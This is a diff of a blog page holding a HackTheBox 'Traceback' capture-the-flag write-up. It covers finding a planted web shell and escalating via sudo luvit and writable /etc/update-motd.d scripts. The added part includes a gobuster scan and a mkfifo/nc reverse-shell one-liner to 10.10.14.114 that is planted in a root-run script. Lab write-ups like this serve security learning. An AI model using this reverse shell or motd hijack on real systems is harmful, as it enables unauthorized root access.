@@ -8,7 +8,7 @@
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="description" content="Hey guys, this is my writeup for the HackTheBox machine Traceback. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, Okay so...">
+  <meta name="description" content="Hey guys, this is my writeup for the HackTheBox machine Traceback. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, The mac...">
   <meta name="keywords" content="blog and jekyll">
   <meta name="author" content="HTB Traceback writeup | Sp3kt0rZ">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -17,7 +17,7 @@
   <!-- Twitter Tags -->
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="HTB Traceback writeup | Sp3kt0rZ">
-  <meta name="twitter:description" content="Hey guys, this is my writeup for the HackTheBox machine Traceback. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, Okay so...">
+  <meta name="twitter:description" content="Hey guys, this is my writeup for the HackTheBox machine Traceback. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, The mac...">
   
     <meta property="twitter:image" content="http://localhost:4000/img/leonids-logo.png">
   
@@ -26,7 +26,7 @@
   <meta property="og:type" content="blog">
   <meta property="og:url" content="http://localhost:4000/articles/2020-08/lets">
   <meta property="og:title" content="HTB Traceback writeup | Sp3kt0rZ">
-  <meta property="og:description" content="Hey guys, this is my writeup for the HackTheBox machine Traceback. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, Okay so...">
+  <meta property="og:description" content="Hey guys, this is my writeup for the HackTheBox machine Traceback. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, The mac...">
   
     <meta property="og:image" content="http://localhost:4000/img/leonids-logo.png">
   
@@ -155,7 +155,7 @@
       <span class="read-time" title="Estimated read time">
   
   
-    5 mins read
+    6 mins read
   
 </span>
 
@@ -164,7 +164,7 @@
   </header>
 
   <article class="post-content">
-    <p>Hey guys, this is my writeup for the <code class="language-plaintext highlighter-rouge">HackTheBox</code> machine <code class="language-plaintext highlighter-rouge">Traceback</code>. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, Okay so  the machine starts of with a <code class="language-plaintext highlighter-rouge">web server</code> that has been <code class="language-plaintext highlighter-rouge">compromised</code> and defaced, the hacker leaves a <code class="language-plaintext highlighter-rouge">backdoor</code> behind “for all the net” :), so we do some guess work and find the shell left behind and that’s the <code class="language-plaintext highlighter-rouge">foothold</code>. after accessing the <code class="language-plaintext highlighter-rouge">reverse shell</code> we do some recon and find that we can run <code class="language-plaintext highlighter-rouge">luvit</code> with <code class="language-plaintext highlighter-rouge">sudo privileges</code>, i then write an <code class="language-plaintext highlighter-rouge">ssh key</code> to the <code class="language-plaintext highlighter-rouge">sysadmins</code> ssh folder and get a shell as the <code class="language-plaintext highlighter-rouge">sysadmin</code>, for <code class="language-plaintext highlighter-rouge">root</code> we have a cron running with administrative privileges that runs everytime on a ssh login, we have the ability write the files that are executed when the cron runss.</p>
+    <p>Hey guys, this is my writeup for the <code class="language-plaintext highlighter-rouge">HackTheBox</code> machine <code class="language-plaintext highlighter-rouge">Traceback</code>. This is my first writeup so it won’t be perfect. This was an Easy rated Linux box, The machine starts of with a <code class="language-plaintext highlighter-rouge">web server</code> that has been <code class="language-plaintext highlighter-rouge">compromised</code> and defaced, the hacker leaves a <code class="language-plaintext highlighter-rouge">backdoor</code> behind “for all the net” :), so we do some guess work and find the shell left behind and that’s the <code class="language-plaintext highlighter-rouge">foothold</code>. after accessing the <code class="language-plaintext highlighter-rouge">reverse shell</code> we do some recon and find that we can run <code class="language-plaintext highlighter-rouge">luvit</code> with <code class="language-plaintext highlighter-rouge">sudo privileges</code>, i then write an <code class="language-plaintext highlighter-rouge">ssh key</code> to the <code class="language-plaintext highlighter-rouge">sysadmins</code> ssh folder and get a shell as the <code class="language-plaintext highlighter-rouge">sysadmin</code>, for <code class="language-plaintext highlighter-rouge">root</code> we have a cron running with administrative privileges that runs everytime on a ssh login, we have the ability write the files that are executed when the cron runss.</p>
 
 <p><img src="/img/tr_con.png" alt="Traceback" />
 <!--more--></p>
@@ -195,7 +195,9 @@
 
 <p><img src="/img/tr_page_source.png" alt="page source" /></p>
 
-<p>So i copied the comment and googled it, it brought me to a <a href="https://github.com/TheBinitGhimire/Web-Shells">github repository</a> with a list of web shells, i could’ve done a better job at guessing which web shell was running on the server but i instead decided to start at the bottom of the list entering each file name, luckily the one i was looking for was second last.</p>
+<p>So i copied the comment and googled it, it brought me to a <a href="https://github.com/TheBinitGhimire/Web-Shells">github repository</a> with a list of web shells, i could’ve done a better job at guessing which web shell was running on the server but i instead decided to start at the bottom of the list entering each file name, luckily the one i was looking for was second last, but i would normally run a gobust.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.181/ <span class="nt">-w</span> <span class="o">[</span>wordlist] <span class="nt">-t</span> 25 <span class="nt">-x</span> php,txt <span class="nt">-outfile</span>.txt</code></pre></figure>
 
 <p><img src="/img/tr_shell.png" alt="shell" /></p>
 
@@ -263,12 +265,26 @@
 
 <p>On the <code class="language-plaintext highlighter-rouge">LinPeas</code> output i also saw something else that was interesting, we could write files in the <code class="language-plaintext highlighter-rouge">/etc/update-motd.d</code>
 when i login with ssh run parts executes all the scripts in the directory, these scripts are also backep up every 30 seconds  , 
-i found this out after some time analyzing what was happening. i think this was also a wat for the hacker to have a way to have root privileges in an easy and hidden way.</p>
+i found this out after some time analyzing what was happening. i think this was also a way for the hacker to have a way to have root privileges in an easy and hidden way.</p>
 
 <p><img src="/img/tr_ls_w.png" alt="ls_w" /></p>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">get <span class="nb">command
-</span>exe <span class="nb">command</span></code></pre></figure>
+<p>After seeing that i ran <a href="https://github.com/DominicBreuker/pspy">Pspy</a>, a tool for analyzing linux system processes. This is when i saw the backups of the scripts in <code class="language-plaintext highlighter-rouge">/etc/update-motd.d</code> where being made every 30 seconds.</p>
+
+<p><img src="/img/tr_pspy.png" alt="ps_py" /></p>
+
+<p>This is also means if i modify the one of scripts in this directory it will be removed in 30 seconds.
+when i log in with ssh run-parts executes the scripts in <code class="language-plaintext highlighter-rouge">/etc/update-motd.d</code>.</p>
+
+<p><img src="/img/tr_ssh_pspy.png" alt="run-parts" /></p>
+
+<p>So my method to get root here is simeple now, i have to put a reverse shell command inside one of these scripts owned and executed by root and have a listener.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.114 9002&gt;/tmp/f</code></pre></figure>
+
+<p>After making this modification i have to login with ssh during the 30 second period of the scripts not being backed up, after i login i get the root shell.</p>
+
+<p><img src="/img/tr_root_shell.png" alt="root" /></p>
 
 
   </article>
